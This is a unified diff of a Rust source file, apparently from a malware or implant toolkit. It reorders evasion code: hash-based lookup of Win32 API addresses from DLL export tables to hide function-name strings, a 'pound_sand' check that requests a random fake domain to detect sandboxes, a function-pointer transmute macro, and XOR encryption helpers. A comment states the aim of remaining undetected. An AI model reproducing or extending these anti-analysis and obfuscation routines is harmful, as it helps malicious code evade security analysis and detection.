@@ -39,6 +39,31 @@ use windows::core::PCSTR;
 use windows::Win32::Networking::WinInet::{InternetOpenA, InternetOpenUrlA};
 
 /*
+    Macros before functions
+*/
+
+#[macro_export]
+macro_rules! construct_win32_function {
+    // Take in:
+    //   one x - the function pointer
+    //   zero or more y - the function argument data types
+    //   zero or more z - the function return data types
+    (
+        $(
+            $x:expr; [ $( $y:ty ),* ]; [ $( $z:ty ),* ]
+        );*
+    ) => {
+        // Interpret the memory at the provided function pointer "x" as a function with args "y" and return "z"
+        // Based on https://rust-lang.github.io/unsafe-code-guidelines/layout/function-pointers.html
+        //   this is a safe transmute because it will be guaranteed on Windows
+        // So the macro is safe despite the unsafe code
+        unsafe {
+            std::mem::transmute::<*const (), unsafe fn( $($( $y ),*),* ) -> $($( $z ),*),*>($( $x ),*)
+        }
+    }
+}
+
+/*
     Calculate the hash of a hashable value
 */
 
@@ -48,6 +73,7 @@ pub fn calculate_hash<T: Hash>(t: &T) -> u64 {
     t.hash(&mut s);
     s.finish()
 }
+
 
 /*
     Helper function for XOR - makes two slices the same length by repeating the shorter till it's the length of the longer
@@ -67,148 +93,6 @@ fn equalize_slice_len<T: std::clone::Clone>(slice_one: &[T], slice_two: &[T]) ->
 
 /*
     Find Win32 function implementation - finds the memory location of a Win32 function in its DLL so it can be called directly
-*/
-
-#[cfg(all(windows, feature = "antistring"))]
-pub fn find_function_address(dll: &str, name_hash: u64) -> Result<*const (), Box<dyn Error>> {
-    // Call LoadLibraryA on a DLL to get its base address
-    let mut lib_filename = PCSTR::null();
-    lib_filename.0 = CString::new(dll).unwrap().into_raw() as *mut u8;
-    let library_base = match unsafe { LoadLibraryA(lib_filename) } {
-        Ok(value) => value,
-        Err(_) => panic!("Could not load {lib_filename:?}"),
-    };
-    let library_base_usize = library_base.0 as usize;
-
-    // Get a pointer to the DOS header
-    let dos_header: *const IMAGE_DOS_HEADER = library_base.0 as *const IMAGE_DOS_HEADER;
-
-#[cfg(feature = "xor")]
-pub fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
-    let equalilzed = equalize_slice_len(key, text);
-    let key: &[u8] = &equalilzed.0[..];
-    let text: &[u8] = &equalilzed.1[..];
-    xor_u8_slices(key, text)
-}
-
-/*
-    XOR not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
-*/
-
-#[cfg(not(feature = "xor"))]
-pub fn xor_encrypt_decrypt(_key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
-    Ok(text.to_vec())
-}
-
-/*
-    Antisand Windows implementation - basically looks to see if something fakes a response to a website
-*/
-
-#[cfg(all(windows, feature = "antisand", not(feature = "antistring")))]
-pub fn pound_sand() -> bool {
-    // Call InternetOpenA to get a handle that can be used in an actual internet request
-    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
-    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenA.html
-    let lpsz_agent = PCSTR::from_raw("Name in user-agent\0".as_mut_ptr());
-    let internet_handle = unsafe { InternetOpenA(lpsz_agent, 0, PCSTR::null(), PCSTR::null(), 0) };
-
-    // Generate a "website" to search for
-    let length = rand::thread_rng().gen_range(20..40);
-    let alphanum: String = rand::thread_rng()
-        .sample_iter(&Alphanumeric)
-        .take(length)
-        .map(char::from)
-        .collect();
-    let mut full_link: String = "https://www.".to_owned();
-    let link_end: String = ".com".to_owned();
-    full_link.push_str(&alphanum);
-    full_link.push_str(&link_end);
-
-    // Call InternetOpenUrlA on the fake website; if there is a response, it's a sandbox trying to get you to take further action
-    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla
-    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenUrlA.html
-    let lpsz_url = PCSTR::from_raw(format!("{full_link}\0").as_mut_ptr());
-    let website = unsafe { InternetOpenUrlA(internet_handle, lpsz_url, None, 0, 0) };
-    if website != 0 as _ {
-        return true;
-    }
-    false
-}
-
-/*
-    Antisand Windows implementation without string artifacts - basically looks to see if something fakes a response to a website
-*/
-
-#[cfg(all(windows, feature = "antisand", feature = "antistring"))]
-pub fn pound_sand() -> bool {
-    let function = find_function_address("Wininet", 0x4b98c7b42f5ce34f).unwrap();
-    let lpsz_agent = PCSTR::from_raw("Name in user-agent\0".as_mut_ptr());
-    let internet_handle = unsafe {
-        mem::transmute::<*const (), fn(PCSTR, i32, PCSTR, PCSTR, i32) -> *mut c_void>(function)(
-            lpsz_agent,
-            0,
-            PCSTR::null(),
-            PCSTR::null(),
-            0,
-        )
-    };
-
-    let length = rand::thread_rng().gen_range(20..40);
-    let alphanum: String = rand::thread_rng()
-        .sample_iter(&Alphanumeric)
-        .take(length)
-        .map(char::from)
-        .collect();
-    let mut full_link: String = "https://www.".to_owned();
-    let link_end: String = ".com".to_owned();
-    full_link.push_str(&alphanum);
-    full_link.push_str(&link_end);
-
-    let function = find_function_address("Wininet", 0x275e2d4fe536ed19).unwrap();
-    let lpsz_url = PCSTR::from_raw(format!("{full_link}\0").as_mut_ptr());
-    let website = unsafe {
-        mem::transmute::<*const (), fn(*mut c_void, PCSTR, &[u8], u32, usize) -> *mut c_void>(
-            function,
-        )(internet_handle, lpsz_url, &[], 0, 0)
-    };
-    if website != 0 as _ {
-        return true;
-    }
-    false
-}
-
-/*
-    Antisand Linux implementation - since I currently don't need to do this to remain undetected it's a dummy (does nothing)
-*/
-
-#[cfg(all(target_os = "linux", feature = "antisand"))]
-pub fn pound_sand() -> bool {
-    false
-}
-
-/*
-    Antisand not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
-*/
-
-#[cfg(not(feature = "antisand"))]
-pub fn pound_sand() -> bool {
-    false
-}
-
-/*
-    XOR implementation - takes in a key and a value and outputs the key ^ value byte-bye-byte
-*/
-
-#[cfg(feature = "xor")]
-pub fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
-    let equalilzed = equalize_slice_len(key, text);
-    let key: &[u8] = &equalilzed.0[..];
-    let text: &[u8] = &equalilzed.1[..];
-    xor_u8_slices(key, text)
-}
-
-/*
-    XOR not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
 */
 
 #[cfg(all(windows, feature = "antistring"))]
@@ -282,6 +166,133 @@ pub fn find_function_address(dll: &str, name_hash: u64) -> Result<*const (), Box
             // Read the function address's location from memory
             let function_address_rva: u32 = unsafe { ptr::read(function_address_rva_address) as u32 };
 
+            // Calculate the function's real address
+            let function_address: *const () = (library_base_usize + function_address_rva as usize) as *const ();
+
+            return Ok(function_address);
+        }
+    }
+    Err(format!("Could not find the function '{name_hash:x}' in '{dll}'").into())
+}
+
+/*
+    Antisand Windows implementation - basically looks to see if something fakes a response to a website
+*/
+
+#[cfg(all(windows, feature = "antisand", not(feature = "antistring")))]
+pub fn pound_sand() -> bool {
+    // Call InternetOpenA to get a handle that can be used in an actual internet request
+    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenA.html
+    let lpsz_agent = PCSTR::from_raw("Name in user-agent\0".as_mut_ptr());
+    let internet_handle = unsafe { InternetOpenA(lpsz_agent, 0, PCSTR::null(), PCSTR::null(), 0) };
+
+    // Generate a "website" to search for
+    let length = rand::thread_rng().gen_range(20..40);
+    let alphanum: String = rand::thread_rng()
+        .sample_iter(&Alphanumeric)
+        .take(length)
+        .map(char::from)
+        .collect();
+    let mut full_link: String = "https://www.".to_owned();
+    let link_end: String = ".com".to_owned();
+    full_link.push_str(&alphanum);
+    full_link.push_str(&link_end);
+
+    // Call InternetOpenUrlA on the fake website; if there is a response, it's a sandbox trying to get you to take further action
+    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenUrlA.html
+    let lpsz_url = PCSTR::from_raw(format!("{full_link}\0").as_mut_ptr());
+    let website = unsafe { InternetOpenUrlA(internet_handle, lpsz_url, None, 0, 0) };
+    if website != 0 as _ {
+        return true;
+    }
+    false
+}
+
+/*
+    Antisand Windows implementation without string artifacts - basically looks to see if something fakes a response to a website
+*/
+
+#[cfg(all(windows, feature = "antisand", feature = "antistring"))]
+pub fn pound_sand() -> bool {
+    // See line 90
+    let function = find_function_address("Wininet", 0x4b98c7b42f5ce34f).unwrap();
+    let lpsz_agent = PCSTR::from_raw("Name in user-agent\0".as_mut_ptr());
+    let internet_handle = unsafe {
+        mem::transmute::<*const (), fn(PCSTR, i32, PCSTR, PCSTR, i32) -> *mut c_void>(function)(
+            lpsz_agent,
+            0,
+            PCSTR::null(),
+            PCSTR::null(),
+            0,
+        )
+    };
+
+    let length = rand::thread_rng().gen_range(20..40);
+    let alphanum: String = rand::thread_rng()
+        .sample_iter(&Alphanumeric)
+        .take(length)
+        .map(char::from)
+        .collect();
+    let mut full_link: String = "https://www.".to_owned();
+    let link_end: String = ".com".to_owned();
+    full_link.push_str(&alphanum);
+    full_link.push_str(&link_end);
+
+    // See line 111
+    let function = find_function_address("Wininet", 0x275e2d4fe536ed19).unwrap();
+    let lpsz_url = PCSTR::from_raw(format!("{full_link}\0").as_mut_ptr());
+    let website = unsafe {
+        mem::transmute::<*const (), fn(*mut c_void, PCSTR, &[u8], u32, usize) -> *mut c_void>(
+            function,
+        )(internet_handle, lpsz_url, &[], 0, 0)
+    };
+    if website != 0 as _ {
+        return true;
+    }
+    false
+}
+
+/*
+    Antisand Linux implementation - since I currently don't need to do this to remain undetected it's a dummy (does nothing)
+*/
+
+#[cfg(all(target_os = "linux", feature = "antisand"))]
+pub fn pound_sand() -> bool {
+    false
+}
+
+/*
+    Antisand not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
+*/
+
+#[cfg(not(feature = "antisand"))]
+pub fn pound_sand() -> bool {
+    false
+}
+
+/*
+    XOR implementation - takes in a key and a value and outputs the key ^ value byte-bye-byte
+*/
+
+#[cfg(feature = "xor")]
+pub fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
+    let equalilzed = equalize_slice_len(key, text);
+    let key: &[u8] = &equalilzed.0[..];
+    let text: &[u8] = &equalilzed.1[..];
+    xor_u8_slices(key, text)
+}
+
+/*
+    XOR not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
+*/
+
+#[cfg(not(feature = "xor"))]
+pub fn xor_encrypt_decrypt(_key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
+    Ok(text.to_vec())
+}
+
 /*
     Helper function for XOR - XORs two slices of equal length
 */
@@ -296,25 +307,4 @@ fn xor_u8_slices(slice_one: &[u8], slice_two: &[u8]) -> Result<Vec<u8>, Box<dyn 
         .zip(slice_two.iter())
         .map(|(&x1, &x2)| x1 ^ x2)
         .collect())
-}
-
-#[macro_export]
-macro_rules! construct_win32_function {
-    // Take in:
-    //   one x - the function pointer
-    //   zero or more y - the function argument data types
-    //   zero or more z - the function return data types
-    (
-        $(
-            $x:expr; [ $( $y:ty ),* ]; [ $( $z:ty ),* ]
-        );*
-    ) => {
-        // Interpret the memory at the provided function pointer "x" as a function with args "y" and return "z"
-        // Based on https://rust-lang.github.io/unsafe-code-guidelines/layout/function-pointers.html
-        //   this is a safe transmute because it will be guaranteed on Windows, so the macro is safe
-        //   despite the unsafe code
-        unsafe {
-            std::mem::transmute::<*const (), unsafe fn( $($( $y ),*),* ) -> $($( $z ),*),*>($( $x ),*)
-        }
-    }
 }
